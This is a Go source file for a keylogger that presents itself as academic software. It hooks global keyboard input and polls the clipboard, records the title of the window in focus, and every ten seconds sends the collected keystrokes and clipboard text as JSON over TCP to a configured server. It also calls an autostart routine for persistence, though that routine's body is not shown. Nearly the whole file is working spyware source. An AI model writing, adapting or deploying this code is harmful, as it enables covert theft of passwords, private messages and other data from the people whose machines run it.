// STATEMENT:
// In consideration of all possible negative effects this software will bring,
// this software is developed only for academic usage.
// Any malicious usage of this software is forbidden and unrelated to the author.

//go:build windows || linux || darwin

package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/atotto/clipboard"
	"github.com/go-vgo/robotgo"
	hook "github.com/robotn/gohook"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"io/ioutil"
	"net"
	"os"
	"os/signal"
	"time"
	"unicode/utf8"
)

// KeyType is the alias of string
type KeyType string

const (
	Protocol = "tcp"
	Address  = "127.0.0.1:8722"

	AppName = "Keylogger"

	TypeKeyboard  KeyType = "KYBD"
	TypeClipboard KeyType = "CPBD"
	TypeControl   KeyType = "CTRL"

	Interval = 10 * time.Second
)

var ControlCharacters = map[rune]string{
	rune(0):   "NULL", // Null character
	rune(1):   "SOH",  // Start of header
	rune(2):   "STX",  // Start of text
	rune(3):   "ETX",  // End of text
	rune(4):   "EOT",  // End of transmission
	rune(5):   "ENQ",  // Enquiry
	rune(6):   "ACK",  // Acknowledgement
	rune(7):   "BEL",  // Bell
	rune(8):   "BS",   // Backspace
	rune(9):   "HT",   // Horizontal tab
	rune(10):  "LF",   // Line feed
	rune(11):  "VT",   // Vertical tab
	rune(12):  "FF",   // Form feed
	rune(13):  "CR",   // Carriage return
	rune(14):  "SO",   // Shift out
	rune(15):  "SI",   // Shift in
	rune(16):  "DLE",  // Data link escape
	rune(17):  "DC1",  // Device control 1
	rune(18):  "DC2",  // Device control 2
	rune(19):  "DC3",  // Device control 3
	rune(20):  "DC4",  // Device control 4
	rune(21):  "NAK",  // Negative acknowledgement
	rune(22):  "SYN",  // Synchronous idle
	rune(23):  "ETB",  // End of transmission block
	rune(24):  "CAN",  // Cancel
	rune(25):  "EM",   // End of medium
	rune(26):  "SUB",  // Substitute
	rune(27):  "ESC",  // Escape
	rune(28):  "FS",   // File separator
	rune(29):  "GS",   // Group separator
	rune(30):  "RS",   // Record separator
	rune(31):  "US",   // Unit separator
	rune(127): "DEL",  // Delete
}

type keyLog struct {
	Time  int64   `json:"time"`
	Type  KeyType `json:"type"`
	Title string  `json:"title"`
	Value string  `json:"value"`
}

func newKeyLog(keyType KeyType, title string, value string) keyLog {
	return keyLog{
		Time:  time.Now().UnixMilli(),
		Type:  keyType,
		Title: title,
		Value: value,
	}
}

var keyLogs []keyLog
var ticker = time.NewTicker(Interval)

func main() {
	// Register autostart service.
	setAutostart()
	// Start a goroutine to listen clipboard.
	go listenClipboard()
	// Start a goroutine to listen keyboard.
	go listenKeyboard()
	// Start a goroutine to send logs.
	go autoSend()
	// Make a channel for receiving system signal.
	c := make(chan os.Signal)
	// Detect interrupt (ctrl+C) signal.
	signal.Notify(c, os.Interrupt)
	// Block until received interrupt signal.
	select {
	case <-c:
		// Send the residual logs.
		if len(keyLogs) > 0 {
			sendLogs()
		}
	}
}

// listenClipboard listens and logs changes of clipboard.
func listenClipboard() {
	var text string
	for {
		// Read from clipboard.
		t, _ := clipboard.ReadAll()
		// If the clipboard is nonempty string or has been changed, log it and reset ticker.
		if t != text && t != "" {
			text = t
			keyLogs = append(keyLogs, newKeyLog(TypeClipboard, getTitle(), text))
			ticker.Reset(Interval)
		}
	}
}

// listenKeyboard listens and logs the events of keyboard.
func listenKeyboard() {
	evChan := hook.Start()
	defer hook.End()
	for ev := range evChan {
		// hook.Start() listens events including mouse and keyboard actions. Only character keys (letters, numbers,
		// symbols, space, enter, etc.) will call the hook.KeyDown event, others (ctrl, alt, f1, etc.) will not. Thus,
		// if detected characters typed, log it and reset ticker.
		if ev.Kind == hook.KeyDown {
			// Get title.
			title := getTitle()
			// Handle control characters (ASCII from 0 to 31 and 127)
			if ev.Keychar < 32 || ev.Keychar == 127 {
				keyLogs = append(keyLogs, newKeyLog(TypeControl, title, ControlCharacters[ev.Keychar]))
			} else {
				// When nothing logged or the last recorded character is not TypeKeyboard, append a new logKey object
				// directly. If it has recorded and the last recorded type is also TypeKeyboard, append the character to
				// the Value field of the last object.
				if len(keyLogs) == 0 {
					keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, title, fmt.Sprintf("%c", ev.Keychar)))
				} else {
					if keyLogs[len(keyLogs)-1].Type == TypeKeyboard {
						if keyLogs[len(keyLogs)-1].Title == title {
							keyLogs[len(keyLogs)-1].Value += fmt.Sprintf("%c", ev.Keychar)
						} else {
							keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, title, fmt.Sprintf("%c", ev.Keychar)))
						}
					} else {
						keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, title, fmt.Sprintf("%c", ev.Keychar)))
					}
				}
			}
			ticker.Reset(Interval)
		}
	}
}

// getTitle gets the currently focused application title and convert to UTF-8 texts according to its original charset.
func getTitle() string {
	titleBytes := []byte(robotgo.GetTitle())
	if utf8.Valid(titleBytes) {
		return string(titleBytes)
	} else {
		title, _ := ioutil.ReadAll(transform.NewReader(bytes.NewBuffer(titleBytes), simplifiedchinese.GB18030.NewDecoder()))
		return string(title)
	}
}

// autoSend detects signal from the ticker, then send logs to the target server.
func autoSend() {
	for {
		select {
		// When there is no operation for a specific time interval, send logs.
		case <-ticker.C:
			// Send nonempty logs only.
			if len(keyLogs) > 0 {
				sendLogs()
			}
			ticker.Reset(Interval)
		}
	}
}

// sendLogs sends keyLogs to the target server via TCP.
func sendLogs() {
	// Create TCP end point for dialing.
	laddr, _ := net.ResolveTCPAddr(Protocol, Address)
	// Dial to connect to the server.
	conn, err := net.DialTCP(Protocol, nil, laddr)
	if err != nil {
		return
	}
	defer conn.Close()
	// Serialise keyLog slice to JSON.
	logsBytes, _ := json.Marshal(keyLogs)
	// Send logs to the target server.
	_, err = conn.Write(logsBytes)
	if err != nil {
		fmt.Println(err.Error())
	}
	// Clear the keyLog slice.
	keyLogs = []keyLog{}
}
